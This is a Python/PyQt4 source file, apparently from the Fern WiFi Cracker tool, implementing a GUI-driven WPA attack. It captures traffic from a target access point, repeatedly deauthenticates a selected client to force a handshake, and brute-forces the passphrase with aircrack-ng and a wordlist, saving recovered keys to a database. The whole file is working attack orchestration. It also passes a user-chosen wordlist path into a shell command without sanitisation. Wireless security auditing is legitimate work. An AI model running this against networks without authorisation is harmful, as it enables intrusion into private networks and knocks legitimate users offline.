from core.fern import *
from gui.wpa_attack import *
from core.variables import *

from core import variables

from PyQt4 import QtGui,QtCore
#
# Wpa Attack window class for decrypting wep keys
#

class wpa_attack_dialog(QtGui.QDialog,wpa_window):
    def __init__(self):
        QtGui.QDialog.__init__(self)
        self.setupUi(self)
        self.retranslateUi(self)
        global client_list
        client_list = []

        self.connect(self.wpa_access_point_combo,QtCore.SIGNAL("currentIndexChanged(QString)"),self.selected_wpa_access)
        self.connect(self.wpa_attack_button,QtCore.SIGNAL("clicked()"),self.launch_attack)
        self.connect(self.dictionary_button,QtCore.SIGNAL("clicked()"),self.dictionary_set)
        self.connect(self,QtCore.SIGNAL("update client"),self.update_client_list)
        self.connect(self,QtCore.SIGNAL("client not in list"),self.display_client)
        self.connect(self,QtCore.SIGNAL("client is there"),self.client_available)
        self.connect(self,QtCore.SIGNAL("deauthenticating"),self.deauthenticating_display)
        self.connect(self,QtCore.SIGNAL("handshake captured"),self.handshake_captured)
        self.connect(self,QtCore.SIGNAL("bruteforcing"),self.bruteforce_display)
        self.connect(self,QtCore.SIGNAL("wpa key found"),self.wpa_key_found)
        self.connect(self,QtCore.SIGNAL("update word"),self.update_word_label)
        self.connect(self,QtCore.SIGNAL("update progress bar"),self.update_progress_bar)
        self.connect(self,QtCore.SIGNAL("update speed"),self.update_speed_label)
        self.connect(self,QtCore.SIGNAL("wpa key not found"),self.key_not_found)
        self.connect(self,QtCore.SIGNAL("set maximum"),self.set_maximum)
        self.connect(self,QtCore.SIGNAL("Stop progress display"),self.display_label)
        if len(client_list) == 0:
            thread.start_new_thread(self.auto_add_clients,())

        # wpa_details = {'LEMON': ['00:C0:CA:8B:15:62', '1', '54', '-86']}

        access_point = wpa_details.keys()[0]                                                        # The first key in dictionary

        self.essid_label.setText('<font color=red>%s</font>'%(access_point))                        # Access point name
        self.bssid_label.setText('<font color=red>%s</font>'%(wpa_details[access_point][0]))        # Mac address
        self.channel_label.setText('<font color=red>%s</font>'%(wpa_details[access_point][1]))      # Channel
        self.power_label.setText('<font color=red>%s</font>'%(wpa_details[access_point][3]))        # Power
        self.encrypt_wep_label.setText('<font color=red>WPA</font>')
        self.wpa_access_point_combo.addItems(sorted(wpa_details.keys()))

    #
    # SIGNALS AND SLOTS
    #

    def wpa_disable_items(self):
        self.probe_label.setEnabled(False)
        self.dictionary_label.setEnabled(False)
        self.handshake_label.setEnabled(False)
        self.deauthenticate_label.setEnabled(False)
        self.bruteforcing_label.setEnabled(False)
        self.bruteforce_progress_label.setEnabled(False)
        self.wpa_status_label.setEnabled(False)
        self.probe_label.setText( "Probing Access Point")
        self.dictionary_label.setText( "current dictionary file")
        self.handshake_label.setText( "Handshake status")
        self.wpa_attack_button.setText( "Attack")
        self.deauthenticate_label.setText( "deauthentication status")
        self.bruteforcing_label.setText( "bruteforcing encryption")
        self.bruteforce_progress_label.setText( "current phrase")
        self.wpa_status_label.setText( "wpa encryption status")
        self.wpa_key_label.setText('')
        self.wpa_attack_button.setText('Attack')

    def cancel_wpa_attack(self):
        commands.getstatusoutput('killall airodump-ng')
        commands.getstatusoutput('killall aircrack-ng')
        commands.getstatusoutput('killall aireplay-ng')
        self.disconnect(self.wpa_attack_button,QtCore.SIGNAL("clicked()"),self.cancel_wpa_attack)
        self.connect(self.wpa_attack_button,QtCore.SIGNAL("clicked()"),self.launch_attack)
        icon = QtGui.QIcon()
        icon.addPixmap(QtGui.QPixmap("%s/resources/wifi_6.png"%(os.getcwd())))
        self.wpa_attack_button.setIcon(icon)
        self.wpa_attack_button.setText('Attack')



    def update_client_list(self):
        global client_list
        client_mac_addresses = []
        for mac_address in client_list:
            if str(mac_address) not in client_mac_addresses:
                client_mac_addresses.append(str(mac_address))
        self.client_label_combo.clear()
        self.client_label_combo.addItems(client_mac_addresses)

    def display_client(self):
        self.wpa_status_label.setEnabled(True)
        self.wpa_status_label.setText("<font color=red>Automatically probing and adding clients mac-addresses, please wait...</font>")

    def client_available(self):
        self.wpa_status_label.setEnabled(False)
        self.wpa_status_label.setText("wpa encryption status")

    def deauthenticating_display(self):
        self.deauthenticate_label.setEnabled(True)
        self.deauthenticate_label.setText('<font color=yellow>Deauthenticating %s</font>'%(select_client))

    def handshake_captured(self):
        self.handshake_label.setEnabled(True)
        self.handshake_label.setText('<font color=yellow>Handshake Captured</font>')

    def bruteforce_display(self):
        self.bruteforcing_label.setEnabled(True)
        self.bruteforcing_label.setText('<font color=yellow>Bruteforcing WPA Encryption</font>')

    def wpa_key_found(self):
        global wpa_key_commit
        global wpa_victim_mac_address
        icon = QtGui.QIcon()
        icon.addPixmap(QtGui.QPixmap("%s/resources/wifi_6.png"%(os.getcwd())))
        self.wpa_attack_button.setIcon(icon)
        self.wpa_attack_button.setText('Attack')
        wpa_key_read = reader('/tmp/fern-log/WPA-DUMP/wpa_key.txt')
        self.finished_label.setEnabled(True)
        self.finished_label.setText('<font color=yellow>Finished</font>')
        self.wpa_status_label.setEnabled(True)
        self.wpa_status_label.setText('<font color=yellow>Wpa Encryption Broken</font>')
        self.wpa_key_label.setEnabled(True)
        self.cancel_wpa_attack()
        self.wpa_key_label.setText('<font color=red>%s</font>'%(wpa_key_read))
        if wpa_key_commit == 0:
            set_key_entries(wpa_victim_access,wpa_victim_mac_address,'WPA',wpa_key_read,wpa_victim_channel)            #Add WPA Key to Database Here
            self.emit(QtCore.SIGNAL('update database label'))
            wpa_key_commit += 1



    def update_word_label(self):
        self.bruteforce_progress_label.setEnabled(True)
        self.bruteforce_progress_label.setText('<font color=yellow>%s</font>'%(current_word))

    def update_progress_bar(self):
        self.bruteforce_progressbar.setValue(word_number)

    def update_speed_label(self):
        self.wpa_status_label.setEnabled(True)
        self.wpa_status_label.setText('<font color=yellow>Speed: \t %s</font>'%(current_speed))

    def display_label(self):
        self.wpa_status_label.setEnabled(True)
        self.wpa_status_label.setText('<font color=yellow>Wpa Encryption Broken</font>')

    def key_not_found(self):
        self.finished_label.setEnabled(True)
        self.finished_label.setText('<font color=yellow>Finished</font>')
        if 'wpa_key.txt' in os.listdir('/tmp/fern-log/WPA-DUMP/'):
            pass
        else:
            self.wpa_status_label.setEnabled(True)
            self.wpa_status_label.setText('<font color=red>WPA Key was not found, please try another wordlist file</font>')

    def set_maximum(self):
        self.bruteforce_progressbar.setValue(progress_bar_max)



    #
    # Threads For Automation
    #
    def auto_add_clients(self):
        global client_list
        temp_mac_address = str(wpa_victim_mac_address.strip(' '))
        while temp_mac_address not in client_list:
            if len(client_list) >= 1:
                self.emit(QtCore.SIGNAL("client is there"))
                self.emit(QtCore.SIGNAL("update client"))
                break
            else:
                time.sleep(3)
                self.emit(QtCore.SIGNAL("client not in list"))
                self.client_update()
                self.emit(QtCore.SIGNAL("update client"))



    def client_update(self):
        global client_list

        wpa_clients_str = reader('/tmp/fern-log/WPA/zfern-wpa-01.csv')
        wpa_clients_sort = wpa_clients_str[wpa_clients_str.index('Probed ESSIDs'):-1]
        wpa_clients_sort1 = wpa_clients_sort.replace(',','\n')
        wpa_clients_sort2 = wpa_clients_sort.replace(' ','')
        wpa_clients_sort3 = wpa_clients_sort2.replace(',','\n')
        wpa_clients_list = wpa_clients_sort3.splitlines()

        mac_address = str(wpa_victim_mac_address.strip(' '))

        for iterate in range(0,wpa_clients_sort.count('\n')-1):
            try:
                client1 = wpa_clients_list.index(mac_address) - 5
                client1_calc = wpa_clients_list[client1]
                if client1_calc == ' ' or '':pass
                else:
                    if client1_calc in client_list:
                        pass
                    else:
                        if client1_calc.count(':') == 5:
                            client_list.append(client1_calc)
                            wpa_clients_list.pop(wpa_clients_list.index(mac_address))
            except(IndexError,ValueError):
                pass



    def launch_brutefore(self):
        global control
        crack_process = subprocess.Popen("cd /tmp/fern-log/WPA-DUMP/ \n aircrack-ng -a 2 -w '%s' *.cap -l wpa_key.txt | grep 'Current passphrase'"%(wordlist),
                             shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)

        stdout = crack_process.stdout

        while 'wpa_key.txt' not in os.listdir('/tmp/fern-log/WPA-DUMP/'):
            progress_file = open('/tmp/fern-log/WPA-DUMP/progress.txt','a+')
            file_read = stdout.readline()
            progress_file.write(str(file_read))
            progress_file.close()

        self.emit(QtCore.SIGNAL("wpa key found"))


    def wordlist_check(self):
        control_word = 0
        global current_word
        while control_word != 1:
            controller = current_word
            time.sleep(30)
            if controller == current_word:
                control_word = 1
                self.emit(QtCore.SIGNAL("set maximum"))
                self.emit(QtCore.SIGNAL("wpa key not found"))
            else:
                pass




    def progress_update(self):
        global current_word
        global word_number
        global current_speed
        global word_number
        global control
        while 'wpa_key.txt' not in os.listdir('/tmp/fern-log/WPA-DUMP/'):
            time.sleep(5)
            try:
                current_word = ''
                progress_process = reader('/tmp/fern-log/WPA-DUMP/progress.txt')
                progress_process1 = progress_process.splitlines()
                progress_process2 = progress_process1[-1]
                progress_process3 = progress_process2.replace('Current passphrase:','\n')
                progress_process3 = progress_process3.replace('keys tested','\n')
                progress_process4 = progress_process3.splitlines()
                current_word = progress_process4[-1].strip(' ')
                self.emit(QtCore.SIGNAL("update word"))
                word_number_process = progress_process4[0]
                word_number_process1 = word_number_process.replace(']','\n')
                word_number_process2 = word_number_process1.splitlines()
                word_number = int(word_number_process2[-1])
                self.emit(QtCore.SIGNAL("update progress bar"))
                current_speed_process = progress_process4[1]
                current_speed_process1 = current_speed_process.replace('k/s)','k/s)\n')
                current_speed_process2 = current_speed_process1.splitlines()
                current_speed = current_speed_process2[0].strip(' ')
                self.emit(QtCore.SIGNAL("update speed"))
                if word_number >= progress_bar_max:
                    self.emit(QtCore.SIGNAL("wpa key not found"))
                    control = 1
                    break
                else:
                    pass
                commands.getstatusoutput('rm -r /tmp/fern-log/WPA-DUMP/progress.txt')
            except (IndexError,ValueError,IOError),e:
                pass

        self.emit(QtCore.SIGNAL("Stop progress display"))



    def wpa_capture(self):
        monitor_interface = str(reader('/tmp/fern-log/monitor.log'))
        commands.getstatusoutput('%s airodump-ng --bssid %s --channel %s -w /tmp/fern-log/WPA-DUMP/wpa_dump %s'%(variables.xterm_setting,wpa_victim_mac_address,wpa_victim_channel,monitor_interface))

    def deauthenticate_client(self):
        monitor_interface = str(reader('/tmp/fern-log/monitor.log'))
        commands.getstatusoutput('%s aireplay-ng -a %s -c %s -0 5 %s'%(variables.xterm_setting,wpa_victim_mac_address,select_client,monitor_interface))

    def capture_check(self):
        commands.getstatusoutput('cd /tmp/fern-log/WPA-DUMP/ \n aircrack-ng *.cap | tee capture_status.log')

    def capture_loop(self):
        time.sleep(3)
        self.emit(QtCore.SIGNAL("deauthenticating"))
        while '1 handshake' not in reader('/tmp/fern-log/WPA-DUMP/capture_status.log'):
            thread.start_new_thread(self.deauthenticate_client,())
            time.sleep(10)
            thread.start_new_thread(self.capture_check,())
        self.emit(QtCore.SIGNAL("handshake captured"))                  # Handshake captured
        commands.getstatusoutput('killall airodump-ng')
        commands.getstatusoutput('killall aireplay-ng')
        time.sleep(1)
        self.emit(QtCore.SIGNAL("bruteforcing"))

        thread.start_new_thread(self.launch_brutefore,())

        thread.start_new_thread(self.progress_update,())

        thread.start_new_thread(self.wordlist_check,())



    #
    # Widget Object Functions
    #
    def selected_wpa_access(self):
        global wpa_victim_mac_address
        global wpa_victim_channel
        global wpa_victim_access
        client_list = []
        self.client_label_combo.clear()
        wpa_victim_access = str(self.wpa_access_point_combo.currentText())

        # wpa_details = {'LEMON': ['00:C0:CA:8B:15:62', '1', '54', '-84']}

        wpa_victim_mac_address = wpa_details[wpa_victim_access][0]
        wpa_victim_channel = wpa_details[wpa_victim_access][1]
        wpa_victim_power = wpa_details[wpa_victim_access][3]
        wpa_victim_speed = wpa_details[wpa_victim_access][2]

        self.essid_label.setText('<font color=red>%s</font>'%(str(wpa_victim_access)))
        self.bssid_label.setText('<font color=red>%s</font>'%(str(wpa_victim_mac_address)))
        self.channel_label.setText('<font color=red>%s</font>'%(str(wpa_victim_channel)))
        self.power_label.setText('<font color=red>%s</font>'%(str(wpa_victim_power)))
        self.encrypt_wep_label.setText('<font color=red>WPA</font>')
        self.client_update()
        self.emit(QtCore.SIGNAL("update client"))
        if len(client_list) == 0:
            thread.start_new_thread(self.auto_add_clients,())


    def launch_attack(self):
        global wordlist
        global select_client
        global progress_bar_max
        global wpa_key_commit
        self.wpa_disable_items()
        wpa_key_commit = 0
        self.emit(QtCore.SIGNAL("stop scan"))
        commands.getstatusoutput('killall airodump-ng')
        commands.getstatusoutput('killall airmon-ng')
        commands.getstatusoutput('rm -r /tmp/fern-log/WPA-DUMP/*')
        select_client = self.client_label_combo.currentText()
        if select_client == '':
            self.probe_label.setEnabled(True)
            self.probe_label.setText('<font color=red>Client mac-address is needed</font>')
        else:
            if 'wordlist-settings.dat' not in os.listdir('fern-settings'):
                self.dictionary_label.setEnabled(True)
                self.dictionary_label.setText('<font color=red><b>Select Wordlist</b></font>')
            else:
                self.wpa_status_label.setEnabled(False)
                self.wpa_status_label.setText("wpa encryption status")

                get_temp_name = reader('fern-settings/wordlist-settings.dat')   #Just for displaying name of wordlist to label area
                split_name = get_temp_name.replace('/','\n')
                filename_split = split_name.splitlines()
                try:
                    filename = filename_split[-1]
                except IndexError:
                    self.dictionary_label.setEnabled(True)
                    self.dictionary_label.setText('<font color=red><b>Select Wordlist</b></font>')

                self.dictionary_label.setEnabled(True)
                try:
                    self.dictionary_label.setText('<font color=yellow><b>%s</b></font>'%(filename))
                except UnboundLocalError:
                    pass
                try:
                    wordlist = get_temp_name
                    wordlist_number = reader(get_temp_name)
                except IOError:
                    self.dictionary_label.setText('<font color=red><b>Select Wordlist</b></font>')
                progress_bar_max = wordlist_number.count('\n')
                self.bruteforce_progressbar.setMaximum(progress_bar_max)
                commands.getstatusoutput('killall airodump-ng')
                commands.getstatusoutput('killall aireplay-ng')
                self.probe_label.setEnabled(True)
                self.probe_label.setText("<font color=yellow>Probing Access Point</font>")
                commands.getstatusoutput('touch /tmp/fern-log/WPA-DUMP/capture_status.log')
                self.bruteforce_progressbar.setValue(0)
                self.disconnect(self.wpa_attack_button,QtCore.SIGNAL("clicked()"),self.launch_attack)
                self.connect(self.wpa_attack_button,QtCore.SIGNAL("clicked()"),self.cancel_wpa_attack)
                icon = QtGui.QIcon()
                icon.addPixmap(QtGui.QPixmap("%s/resources/stop.png"%(os.getcwd())))
                self.wpa_attack_button.setIcon(icon)
                self.wpa_attack_button.setText('Stop')

                thread.start_new_thread(self.wpa_capture,())

                thread.start_new_thread(self.capture_loop,())



    def dictionary_set(self):
        filename = QtGui.QFileDialog.getOpenFileName(self,"Select Wordlist","")
        if 'wordlist-settings.dat' in os.listdir('fern-settings'):
            remove('fern-settings','wordlist-settings.dat')
            write('fern-settings/wordlist-settings.dat',filename)

        else:
            write('fern-settings/wordlist-settings.dat',filename)

        get_temp_name = reader('fern-settings/wordlist-settings.dat')
        split_name = get_temp_name.replace('/','\n')
        filename_split = split_name.splitlines()
        try:
            filename = filename_split[-1]
        except IndexError:
            self.dictionary_label.setText('<font color=red><b>Select Wordlist</b></font>')
        self.dictionary_label.setEnabled(True)
        self.dictionary_label.setText('<font color=yellow><b>%s</b></font>'%(filename))

